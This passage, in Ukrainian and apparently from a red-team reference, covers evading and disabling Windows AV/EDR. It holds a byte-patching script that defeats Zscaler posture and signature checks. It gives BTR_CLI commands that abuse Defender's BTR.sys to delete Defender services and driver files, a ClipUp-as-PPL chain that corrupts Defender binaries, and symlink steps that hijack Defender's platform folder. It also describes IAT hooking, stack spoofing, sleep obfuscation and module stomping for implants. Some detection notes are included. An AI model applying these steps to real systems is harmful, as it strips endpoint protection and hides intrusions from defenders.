• Увімкніть список заблокованих вразливих драйверів Microsoft (`HVCI`, `Smart App Control`), щоб Windows відмовлялася завантажувати `AToolsKrnl64.sys`.
• Відстежуйте створення нових служб *kernel* і сповіщайте, якщо драйвер завантажується з каталогу, доступного для запису всім користувачам, або відсутній у списку дозволених.
• Відстежуйте дескриптори user-mode до користувацьких об’єктів пристроїв, за якими йдуть підозрілі виклики `DeviceIoControl`.

### Обхід перевірок стану пристрою Zscaler Client Connector шляхом патчингу бінарних файлів на диску

**Client Connector** від Zscaler локально застосовує правила стану пристрою та покладається на Windows RPC для передавання результатів іншим компонентам. Два слабкі рішення в дизайні дають змогу повністю обійти перевірки:

1. Оцінювання стану пристрою відбувається **цілком на стороні клієнта** (на сервер надсилається логічне значення).
2. Внутрішні кінцеві точки RPC перевіряють лише те, що виконуваний файл, який підключається, **підписаний Zscaler** (за допомогою `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Патчингом чотирьох підписаних бінарних файлів на диску** можна нейтралізувати обидва механізми:

| Бінарний файл | Початкову логіку пропатчено | Результат |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тож кожна перевірка вважається успішною |
| `ZSAService.exe` | Непрямий виклик `WinVerifyTrust` | Замінено на NOP ⇒ будь-який процес (навіть непідписаний) може підключитися до каналів RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінено на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Перевірки цілісності тунелю | Обійдено |

Фрагмент мінімального патчера:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Після заміни оригінальних файлів і перезапуску стека служб:

* Усі перевірки стану відображаються зеленими/відповідними вимогам.
* Непідписані або змінені бінарні файли можуть відкривати кінцеві точки RPC іменованих каналів (наприклад, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Скомпрометований хост отримує необмежений доступ до внутрішньої мережі, визначеної політиками Zscaler.

Цей приклад демонструє, як кілька байтових патчів можуть обійти виключно клієнтські рішення щодо довіри та прості перевірки підписів.

## Microsoft Defender: зловживання довіреною функціональністю `BTR.sys`

Драйвер **Boot-Time Removal** у Defender — корисний контрприклад класичному BYOVD. `BTR.sys` — це легітимний компонент Microsoft із цифровим підписом для усунення загроз, у якому немає помилки пошкодження пам’яті та інтерфейсу IOCTL; натомість, отримавши доступ адміністратора та `SeLoadDriverPrivilege`, оператор може підробити його приватну транзакцію усунення загроз і виконати передбачені операції з файлами/реєстром на рівні Ring-0. Це **примітив нейтралізації AV/EDR після компрометації, а не початковий доступ чи підвищення привілеїв**, причому драйвер можна видобути з ресурсу `BOOTTIMETOOL` у власному `MpEngine.dll` цільової системи, а не імпортувати помітний сторонній драйвер.<sup>[[36]](#references)</sup>

### Підготовка одноразового драйвера

Зазвичай Defender зберігає ресурс у файлі з випадковою назвою `[a-z]{8}.sys` і реєструє однойменну службу ядра. `DriverEntry` читає значення `Args` служби, відкриває вказаний альтернативний потік даних NTFS (ADS), розшифровує та перевіряє список дій, записує зворотний зв’язок і після успішного виконання повертає `0xC0000056` (`STATUS_DELETE_PENDING`), щоб драйвер вивантажився, а не залишався резидентним. Підроблена служба має такі характерні значення.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Потік `:changelist` містить один зашифрований RC4 блок даних. У проаналізованих збірках використовується фіксований 256-байтовий ключ, тому шифрування не є межею авторизації. Коректний відкритий текст містить 24-байтовий глобальний заголовок (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC заголовка та ID транзакції, отриманий на основі корисного навантаження), за яким ідуть шлях зворотного зв’язку у форматі UTF-16 із завершальним нульовим символом і будь-яка кількість елементів. Кожен елемент має 16-байтовий заголовок (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) і специфічні для дії дані, що завершуються **рівно чотирма нульовими байтами**. Кожна область заголовка/даних перевіряється окремо за допомогою CRC-32 з поліномом `0xEDB88320`, початковим станом `0xFFFFFFFF` і **без фінального XOR** (`~CRC32`); стан CRC скидається для кожної області.<sup>[[36]](#references)[[37]](#references)</sup>

Прийняті ID дій надають доступ до таких примітивів ядра.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Дані елемента | Результат |
| --- | --- | --- |
| 1 | `[шлях UTF-16]` | Видаляє файл, зокрема заблокований |
| 2 | `[шлях UTF-16]` | Видаляє порожній каталог |
| 3 | `[прапорці][джерело][призначення]` | Переміщує файл до вибраного зловмисником захищеного шляху; порожнє призначення означає видалення |
| 4 | `[прапорці][шлях до ключа]` | Рекурсивно видаляє ключ реєстру |
| 5 | `[прапорці][шлях до ключа + "\\" + значення]` | Видаляє значення реєстру |
| 6 | `[прапорці][тип][розмір][шлях до ключа + "\\" + значення][дані]` | Створює/оновлює значення реєстру та створює відсутні шляхи ключів |

Для дій 5 і 6 роздільником ключа/значення в переданих даних є **дві послідовні зворотні скісні риски**; шлях у звичайному форматі не буде розділено коректно. Файл зворотного зв’язку здебільшого віддзеркалює запит, але перші чотири байти даних кожного елемента стають його результівним `NTSTATUS`. Для дій 1 і 2, у яких немає початкового поля прапорців, BTR переміщує шлях у чотири зарезервовані кінцеві байти, щоб звільнити місце для цього статусу.<sup>[[36]](#references)</sup>

### Робочий процес `BTR_CLI` і вікно раннього завантаження

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) реалізує весь ланцюжок: вилучає `BTR.sys` із локального Defender, створює `<random>.sys:changelist` і потік зворотного зв’язку, серіалізує/контрольно сумує/шифрує послідовні дії, безпосередньо створює розділ реєстру служби, а потім викликає `NtLoadDriver` для `-trigger now` або залишає драйвер як драйвер із типом запуску system-start для `-trigger boot`. Пряме внесення даних до реєстру обходить звичайний шлях SCM `CreateServiceW`, а отже, **не** створює подію встановлення служби з ID 7045. Артефакти, створені для запуску під час завантаження, можна згодом видалити командою `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` непридатний, оскільки BTR виконує файлові операції з `DriverEntry`, перш ніж стек сховища та посилання `SystemRoot` будуть готові. Натомість `Start=1` у групі з високим пріоритетом `Boot Bus Extender` забезпечує виконання на Phase 1: NTFS уже працює, але багато драйверів безпеки з автозапуском системи та служб EDR у режимі користувача ще не ініціалізовано. Фільтри з автозапуском під час завантаження, як-от `WdFilter`, можуть уже бути завантажені, проте BTR може видалити їхні двійкові файли або конфігурацію служб до наступного запуску, а також видалити виконувані файли служб до їх запуску через SCM. ELAM не усуває цю прогалину, оскільки BTR запускається після перевірки драйверів під час завантаження та має дійсний підпис Microsoft.<sup>[[36]](#references)</sup>

Кілька дій виконуються в одній транзакції. PoC додає на початок Action 1 для жорстко заданого шляху `\SystemRoot\Temp\BootClean.log`: BTR створює цей журнал, а потім виконує власний запит на видалення та видаляє його перед вивантаженням. Це зменшує кількість доказів, а збереження зворотного зв’язку в `<random>.sys:<random>.dat` дає змогу видалити драйвер і обидва потоки разом.<sup>[[36]](#references)[[37]](#references)</sup>

### Кореляції з високим рівнем сигналу

Правила, що враховують лише підпис, і список блокування вразливих драйверів Microsoft не запобігають зловживанню передбаченою функціональністю BTR. Надавайте перевагу таким поведінковим кореляціям, водночас відрізняючи легітимне походження від Defender від довільного процесу запуску.<sup>[[36]](#references)</sup>

- **Sysmon 15:** створення `.sys:changelist` є універсальною ознакою підготовки BTR. Потік ADS `.dat`, приєднаний до того самого `.sys`, особливо підозрілий, оскільки легітимний Defender зазвичай розміщує зворотний зв’язок у `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 без System 7045:** корелюйте безпосереднє створення `HKLM\SYSTEM\CurrentControlSet\Services\<random>` із `Args=...:changelist` та `Group=Boot Bus Extender`, якщо немає відповідної події встановлення SCM.
- **Sysmon 6 -> 23:** корелюйте завантаження відомого драйвера BTR, запущеного не з Defender, із подальшим видаленням файлів, приписаним `System`/PID 4, особливо якщо йдеться про бінарні файли засобів безпеки.
- **Sysmon 11 -> 23:** сповіщайте про швидке створення та видалення `\SystemRoot\Temp\BootClean.log` процесом `System`/PID 4.
- Обмежуйте та аудіюйте надання/увімкнення `SeLoadDriverPrivilege`; сам по собі підпис Microsoft не є достатньою підставою для довіри, якщо драйвер засобу безпеки розміщено через `cmd.exe`, PowerShell або невідомий процес.

## Зловживання Protected Process Light (PPL) для втручання в AV/EDR за допомогою LOLBINs

Protected Process Light (PPL) забезпечує ієрархію рівнів і підписувачів, за якої втручатися один в одного можуть лише захищені процеси з рівним або вищим рівнем. З погляду атакувальника, якщо ви можете легітимно запустити бінарний файл із підтримкою PPL і контролювати його аргументи, можна перетворити нешкідливу функціональність (наприклад, журналювання) на обмежений примітив запису, захищений PPL, для роботи із захищеними каталогами, які використовують AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Що потрібно, щоб процес працював як PPL
- Цільовий EXE (і будь-які завантажені DLL) має бути підписаний EKU, сумісним із PPL.
- Процес потрібно створити за допомогою CreateProcess із прапорцями: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Потрібно запросити сумісний рівень захисту, що відповідає підписувачу бінарного файла (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для підписувачів антивірусного ПЗ, `PROTECTION_LEVEL_WINDOWS` для підписувачів Windows). Неправильні рівні призведуть до помилки створення.

Також дивіться ширший вступ до PP/PPL і захисту LSASS тут:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Інструменти запуску
- Допоміжний інструмент із відкритим кодом: CreateProcessAsPPL (вибирає рівень захисту та передає аргументи цільовому EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Приклад використання:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Примітив LOLBIN: ClipUp.exe
- Підписаний системний бінарний файл `C:\Windows\System32\ClipUp.exe` запускає власний дочірній процес і приймає параметр для запису файлу журналу за вказаним викликачем шляхом.
- Якщо запустити його як процес PPL, запис файлу відбувається з підтримкою PPL.
- ClipUp не може обробляти шляхи, що містять пробіли; використовуйте короткі шляхи 8.3, щоб указати на зазвичай захищені розташування.

Допоміжні засоби для коротких шляхів 8.3
- Перегляд коротких імен: `dir /x` у кожному батьківському каталозі.
- Отримання короткого шляху в cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Ланцюжок зловживання (абстрактно)
1) Запустіть LOLBIN, що підтримує PPL (ClipUp), із прапорцем `CREATE_PROTECTED_PROCESS` за допомогою засобу запуску (наприклад, CreateProcessAsPPL).
2) Передайте аргумент шляху до журналу ClipUp, щоб примусово створити файл у захищеному каталозі AV (наприклад, Defender Platform). За потреби використовуйте короткі імена 8.3.
3) Якщо AV зазвичай відкриває/блокує цільовий бінарний файл під час роботи (наприклад, MsMpEng.exe), заплануйте запис під час завантаження системи, до запуску AV, установивши службу автозапуску, яка гарантовано запускається раніше. Перевірте порядок завантаження за допомогою Process Monitor (журналювання завантаження).
4) Після перезавантаження запис із підтримкою PPL відбувається до того, як AV блокує свої бінарні файли, пошкоджуючи цільовий файл і перешкоджаючи запуску.

Приклад виклику (шляхи приховано/скорочено з міркувань безпеки):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Нотатки та обмеження
- Ви не можете контролювати вміст, який записує ClipUp, окрім місця розташування; цей примітив підходить для пошкодження, а не для точного впровадження вмісту.
- Для встановлення/запуску служби потрібні локальні права адміністратора/SYSTEM і можливість перезавантаження.
- Час має вирішальне значення: цільовий файл не повинен бути відкритим; виконання під час завантаження дає змогу уникнути блокування файлів.

Виявлення
- Створення процесу `ClipUp.exe` із незвичними аргументами, особливо якщо його запускають нестандартні засоби запуску, приблизно під час завантаження.
- Нові служби, налаштовані на автоматичний запуск підозрілих бінарних файлів і стабільно запускаються раніше за Defender/AV. Перевіряйте створення/зміну служб перед збоями запуску Defender.
- Моніторинг цілісності файлів бінарних файлів/каталогів Platform Defender; неочікуване створення/зміна файлів процесами з прапорцями захищеного процесу.
- Телеметрія ETW/EDR: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS`, і аномальне використання рівня PPL процесами, що не належать до AV.

Заходи пом’якшення
- WDAC/Code Integrity: обмежте, які підписані бінарні файли можуть запускатися як PPL і від яких батьківських процесів; блокуйте запуск ClipUp поза легітимними контекстами.
- Гігієна служб: обмежте створення/зміну служб з автоматичним запуском і відстежуйте маніпуляції порядком запуску.
- Переконайтеся, що захист від втручання Defender і захист раннього запуску ввімкнено; перевіряйте помилки запуску, що вказують на пошкодження бінарних файлів.
- Якщо це сумісно з вашим середовищем, розгляньте можливість вимкнути створення коротких імен 8.3 на томах, де розміщені засоби безпеки (ретельно протестуйте).

## Втручання в Microsoft Defender через перехоплення символічного посилання на каталог версії платформи

Windows Defender визначає платформу, з якої запускається, шляхом переліку підпапок у:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Він вибирає підпапку з найвищим лексикографічним рядком версії (наприклад, `4.18.25070.5-0`), а потім запускає звідти процеси служби Defender (відповідно оновлюючи шляхи служби/реєстру). Під час вибору він довіряє записам каталогів, зокрема точкам повторної обробки каталогів (символічним посиланням). Адміністратор може скористатися цим, щоб перенаправити Defender до шляху, доступного для запису зловмисником, і виконати DLL sideloading або порушити роботу служби.<sup>[[21]](#references)[[22]](#references)</sup>

Попередні умови
- Локальний адміністратор (потрібен для створення каталогів/символічних посилань у каталозі Platform)
- Можливість перезавантажити систему або ініціювати повторний вибір платформи Defender (перезапуск служби під час завантаження)
- Потрібні лише вбудовані засоби (mklink)

Чому це працює
- Defender блокує запис у власні папки, але під час вибору платформи довіряє записам каталогів і вибирає версію з найвищим лексикографічним значенням, не перевіряючи, чи веде ціль до захищеного/довіреного шляху.

Покроково (приклад)
1) Підготуйте доступну для запису копію поточної папки платформи, наприклад `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть у Platform symlink каталогу з вищою версією, що вказує на вашу папку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Вибір тригера (рекомендується перезавантаження):
```cmd
shutdown /r /t 0
```
4) Перевірте, що MsMpEng.exe (WinDefend) запускається з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Слідкуйте за новим шляхом процесу в `C:\TMP\AV\` і за конфігурацією служби/реєстром, де має бути вказано це розташування.

Варіанти post-exploitation
- DLL sideloading/виконання коду: розмістіть або замініть DLL, які Defender завантажує з каталогу своєї програми, щоб виконати код у процесах Defender. Див. розділ вище: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Завершення служби/відмова в обслуговуванні: видаліть version-symlink, щоб під час наступного запуску налаштований шлях не розпізнавався і Defender не запускався:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Зверніть увагу: ця техніка сама по собі не підвищує привілеї; для її використання потрібні права адміністратора.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams можуть перенести runtime evasion з C2 implant безпосередньо в цільовий модуль, перехопивши його Import Address Table (IAT) і спрямувавши вибрані API через контрольований зловмисником position-independent code (PIC). Це поширює evasion за межі невеликої кількості API, доступних у багатьох кітах (наприклад, CreateProcessA), і надає такий самий захист BOF і post-exploitation DLL.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Підхід на високому рівні
- Розмістіть PIC blob поруч із цільовим модулем за допомогою reflective loader (додаючи його на початок або як companion). PIC має бути самодостатнім і position-independent.
- Під час завантаження host DLL пройдіть її IMAGE_IMPORT_DESCRIPTOR і змініть записи IAT для цільових імпортів (наприклад, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), щоб вони вказували на тонкі обгортки PIC.
- Кожна обгортка PIC виконує evasion перед tail-call до адреси реального API. Типові методи evasion:
  - Маскування/демаскування пам’яті навколо виклику (наприклад, шифрування ділянок beacon, зміна RWX→RX, назв сторінок/прав доступу), а потім відновлення після виклику.
  - Call-stack spoofing: створення нешкідливого стека й перехід до цільового API так, щоб аналіз стека викликів визначав очікувані фрейми.<sup>[[9]](#references)</sup>
- Для сумісності експортуйте інтерфейс, щоб скрипт Aggressor (або аналог) міг реєструвати API для перехоплення в Beacon, BOF і post-ex DLL.

Навіщо тут IAT hooking
- Працює з будь-яким кодом, який використовує перехоплений імпорт, не вимагаючи змінювати код інструмента чи покладатися на Beacon для проксування конкретних API.
- Охоплює post-ex DLL: перехоплення LoadLibrary* дає змогу перехоплювати завантаження модулів (наприклад, System.Management.Automation.dll, clr.dll) і застосовувати таке саме маскування та stack evasion до їхніх викликів API.
- Дає змогу надійно використовувати post-ex команди, що створюють процеси, проти засобів виявлення на основі стека викликів, обгортаючи CreateProcessA/W.

Мінімальний ескіз IAT hook (псевдокод x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Нотатки
- Застосовуйте патч після релокацій/ASLR і до першого використання імпорту. Reflective loaders, як-от TitanLdr/AceLdr, демонструють перехоплення під час DllMain завантаженого модуля.
- Робіть обгортки мінімальними та безпечними для PIC; знаходьте справжній API через початкове значення IAT, збережене до патчингу, або через LdrGetProcedureAddress.
- Для PIC використовуйте переходи RW → RX і не залишайте сторінки з правами запису й виконання одночасно.

Заглушка підміни стека викликів
- PIC-заглушки в стилі Draugr формують фальшивий ланцюжок викликів (адреси повернення в нешкідливих модулях), а потім передають керування справжньому API.
- Це обходить засоби виявлення, які очікують канонічні стеки від Beacon/BOFs під час виклику чутливих API.
- Поєднуйте це з техніками обрізання стека/зшивання стека, щоб потрапити в очікувані фрейми перед прологом API.

Операційна інтеграція
- Додавайте reflective loader на початок post-ex DLL, щоб PIC і хуки автоматично ініціалізувалися під час завантаження DLL.
- Використовуйте скрипт Aggressor для реєстрації цільових API, щоб Beacon і BOFs прозоро застосовували той самий шлях обходу без змін коду.

Міркування щодо виявлення/DFIR
- Цілісність IAT: записи, що вказують на адреси поза образом (heap/anon); періодична перевірка вказівників імпорту.
- Аномалії стека: адреси повернення, що не належать завантаженим образам; різкі переходи до PIC поза образом; непослідовний ланцюжок предків RtlUserThreadStart.
- Телеметрія завантажувача: записи в IAT із процесу; рання активність DllMain, що змінює import thunks; неочікувані RX-області, створені під час завантаження.
- Обхід контролю завантаження образів: якщо перехоплено LoadLibrary*, відстежуйте підозрілі завантаження automation/clr assemblies, пов’язані з подіями маскування пам’яті.

Пов’язані будівельні блоки та приклади
- Reflective loaders, що виконують патчинг IAT під час завантаження (наприклад, TitanLdr, AceLdr)
- Хуки маскування пам’яті (наприклад, simplehook) і PIC для обрізання стека (stackcutting)
- PIC-заглушки підміни стека викликів (наприклад, Draugr)


## Перехоплення IAT під час імпорту + обфускація під час сну (Crystal Palace/PICO)

### Хуки IAT під час імпорту через резидентний PICO

Якщо ви контролюєте reflective loader, можна перехопити імпорти **під час** `ProcessImports()`, замінивши вказівник `GetProcAddress` завантажувача власним резолвером, який спершу перевіряє хуки:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Створіть **резидентний PICO** (постійний об’єкт PIC), який зберігається після того, як тимчасовий PIC завантажувача звільняє себе.
- Експортуйте функцію `setup_hooks()`, яка перезаписує резолвер імпорту завантажувача (наприклад, `funcs.GetProcAddress = _GetProcAddress`).
- У `_GetProcAddress` пропускайте імпорти за ordinal і використовуйте пошук хуків на основі хешу, наприклад `__resolve_hook(ror13hash(name))`. Якщо хук знайдено, повертайте його; інакше передавайте виклик справжньому `GetProcAddress`.
- Реєструйте цілі хуків під час компонування за допомогою записів Crystal Palace `addhook "MODULE$Func" "hook"`. Хук залишається дійсним, оскільки міститься всередині резидентного PICO.

Це забезпечує **перенаправлення IAT під час імпорту** без патчингу секції коду завантаженої DLL після її завантаження.

### Забезпечення імпортів, які можна перехопити, коли ціль використовує обхід PEB

Хуки під час імпорту спрацьовують лише тоді, коли функція справді є в IAT цілі. Якщо модуль знаходить API через обхід PEB і хеш (без запису імпорту), примусово додайте справжній імпорт, щоб завантажувач обробив його через `ProcessImports()`:

- Замініть пошук експортів за хешем (наприклад, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) на пряме посилання на кшталт `&WaitForSingleObject`.
- Компілятор згенерує запис IAT, що дасть змогу перехопити функцію, коли reflective loader оброблятиме імпорти.

### Обфускація сну/простою в стилі Ekko без патчингу `Sleep()`

Замість патчингу `Sleep` перехоплюйте **фактичні примітиви очікування/IPC**, які використовує implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Для тривалого очікування обгорніть виклик у ланцюжок обфускації в стилі Ekko, який шифрує образ у пам’яті під час простою:<sup>[[31]](#references)[[27]](#references)</sup>

- Використовуйте `CreateTimerQueueTimer`, щоб запланувати послідовність callback-функцій, які викликають `NtContinue` зі сформованими фреймами `CONTEXT`.
- Типовий ланцюжок (x64): встановити для образу `PAGE_READWRITE` → зашифрувати RC4 через `advapi32!SystemFunction032` увесь відображений образ → виконати блокувальне очікування → розшифрувати RC4 → **відновити права доступу для кожної секції**, обійшовши PE-секції → подати сигнал про завершення.
- `RtlCaptureContext` надає шаблон `CONTEXT`; клонуйте його в кілька фреймів і встановіть регістри (`Rip/Rcx/Rdx/R8/R9`) для виклику кожного кроку.

Операційна деталь: повертайте «успіх» для тривалого очікування (наприклад, `WAIT_OBJECT_0`), щоб викликальник продовжив виконання, поки образ замаскований. Цей шаблон приховує модуль від сканерів у періоди простою та уникає класичної сигнатури «пропатчений `Sleep()`».

Ідеї для виявлення (на основі телеметрії)
- Сплески викликів callback-функцій `CreateTimerQueueTimer`, що вказують на `NtContinue`.
- Використання `advapi32!SystemFunction032` для великих суміжних буферів розміром з образ.
- `VirtualProtect` для великого діапазону з подальшим відновленням власних прав доступу для кожної секції.

### Динамічна реєстрація CFG для гаджетів обфускації сну

На цілях із CFG перший непрямий перехід до гаджета всередині функції, наприклад `jmp [rbx]` або `jmp rdi`, зазвичай аварійно завершує процес зі статусом `STATUS_STACK_BUFFER_OVERRUN`, оскільки гаджета немає в метаданих CFG модуля. Щоб ланцюжки в стилі Ekko/Kraken працювали в захищених процесах:<sup>[[30]](#references)</sup>

- Зареєструйте кожну непряму ціль, яку використовує ланцюжок, через `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` і записи `CFG_CALL_TARGET_VALID`.
- Для адрес у завантажених образах (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` має починатися з **базової адреси образу** й охоплювати **весь розмір образу**.
- Для вручну відображених областей/PIC/stomped regions використовуйте **базову адресу виділеної області** та її розмір.
- Позначайте не лише гаджет диспетчеризації, а й експорти, до яких переходять непрямо (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, системні виклики очікування/подій), а також будь-які контрольовані зловмисником виконувані секції, які стануть непрямими цілями.

Це перетворює ланцюжки сну в стилі ROP/JOP з примітива, що «працює лише в процесах без CFG», на багаторазово використовуваний примітив для `explorer.exe`, браузерів, `svchost.exe` та інших кінцевих систем, скомпільованих із `/guard:cf`.

### Підміна стека потоків у режимі сну, сумісна з CET

Повна заміна `CONTEXT` створює помітну активність і може давати збої в системах CET Shadow Stack, оскільки підмінений `Rip` має відповідати апаратному shadow stack. Безпечніший шаблон маскування під час сну:<sup>[[30]](#references)</sup>

- Виберіть інший потік у тому самому процесі та прочитайте межі його стека `NT_TIB` / TEB (`StackBase`, `StackLimit`) через `NtQueryInformationThread`.
- Збережіть резервну копію справжнього TEB/TIB поточного потоку.
- Отримайте справжній контекст потоку, що переходить у режим сну, за допомогою `GetThreadContext`.
- Скопіюйте **лише** справжній `Rip` у підмінений контекст, залишивши підмінений стан `Rsp`/стека без змін.
- Під час сну скопіюйте `NT_TIB` підмінного потоку в TEB поточного потоку, щоб stack walkers розмотували стек у межах легітимного діапазону.
- Після завершення очікування відновіть початкові TIB і контекст потоку.

Це зберігає узгоджений із CET вказівник інструкцій і водночас вводить в оману stack walkers EDR, які довіряють метаданим стека TEB під час перевірки розмотування стека.

### Альтернатива на основі APC: Kraken Mask

Якщо диспетчеризація через timer queue має надто впізнавану сигнатуру, ту саму послідовність «сон-шифрування-підміна-відновлення» можна виконати з призупиненого допоміжного потоку за допомогою поставлених у чергу APC:<sup>[[27]](#references)</sup>

- Створіть допоміжний потік із `NtTestAlert` як точкою входу.
- Поставте підготовлені фрейми `CONTEXT`/APC у чергу через `NtQueueApcThread` і виконайте їх за допомогою `NtAlertResumeThread`.
- Зберігайте стан ланцюжка в heap, а не в стеку допоміжного потоку, щоб не вичерпати стандартний стек потоку розміром 64 KB.
- Використовуйте `NtSignalAndWaitForSingleObject`, щоб атомарно подати сигнал про подію початку й заблокуватися.
- Призупиніть головний потік перед відновленням TIB/контексту (`NtSuspendThread` → відновлення → `NtResumeThread`), щоб зменшити часовий проміжок, коли сканер може виявити частково відновлений стек.

Це замінює сигнатуру `CreateTimerQueueTimer` + `NtContinue` на сигнатуру допоміжного потоку/APC, зберігаючи ті самі цілі RC4-маскування та підміни стека.

Додаткові ідеї для виявлення
- Виклик `NtSetInformationVirtualMemory` із `VmCfgCallTargetInformation` незадовго до сну, очікування або диспетчеризації APC.
- `GetThreadContext`/`SetThreadContext` навколо `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` або `ConnectNamedPipe`.
- Виклик `NtQueryInformationThread` із подальшим прямим записом у межі стека TEB/TIB поточного потоку.
- Ланцюжки `NtQueueApcThread`/`NtAlertResumeThread`, які опосередковано викликають `SystemFunction032`, `VirtualProtect` або допоміжні функції відновлення прав доступу секцій.
- Повторне використання коротких сигнатур гаджетів, як-от `FF 23` (`jmp [rbx]`) або `FF E7` (`jmp rdi`), як точок перемикання диспетчеризації всередині підписаних модулів.


## Точне stomp-ування модулів

Module stomping виконує payload із **секції `.text` DLL, уже відображеної в цільовому процесі**, замість виділення очевидної приватної виконуваної пам’яті або завантаження нової DLL-жертви. Ціль перезапису має бути **завантаженим образом на диску**, чий простір коду може вмістити payload, не пошкодивши шляхи виконання коду, які процесу ще потрібні.<sup>[[1]](#references)[[2]](#references)</sup>

### Надійний вибір цілі

Наївне stomp-ування поширених модулів, як-от `uxtheme.dll` або `comctl32.dll`, ненадійне: DLL може бути не завантажена у віддаленому процесі, а надто мала область коду призведе до збою процесу. Надійніший робочий процес:

1. Перелічіть модулі цільового процесу та залиште **список включення лише з назвами** вже завантажених DLL.
2. Спершу зберіть payload і зафіксуйте його **точний розмір у байтах**.
3. Проскануйте DLL-кандидати на диску та порівняйте **`Misc_VirtualSize` секції PE `.text`** із розміром payload. Це важливіше за розмір файла, оскільки відображає розмір виконуваної секції **після відображення в пам’яті**.
4. Розберіть **таблицю адрес експорту (EAT)** і виберіть RVA експортованої функції як початкове зміщення для stomp-ування.
5. Оцініть **радіус ураження**: якщо payload виходить за межі вибраної функції, він перезапише сусідні експорти, розташовані після неї в пам’яті.

Типові допоміжні засоби розвідки/вибору цілі, які трапляються на практиці:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Операційні примітки
- Надавайте перевагу DLL, **які вже завантажені** у віддалений процес, щоб уникнути телеметрії `LoadLibrary`/неочікуваних завантажень образів.
- Надавайте перевагу експорту, який цільова програма виконує рідко, інакше звичайні шляхи виконання коду можуть звернутися до перезаписаних байтів до або після створення потоку.
- Для великих імплантів часто потрібно змінити вбудовування shellcode: замість рядкового літерала використовувати **масив байтів/ініціалізатор у фігурних дужках**, щоб повний буфер було правильно представлено у вихідному коді інжектора.

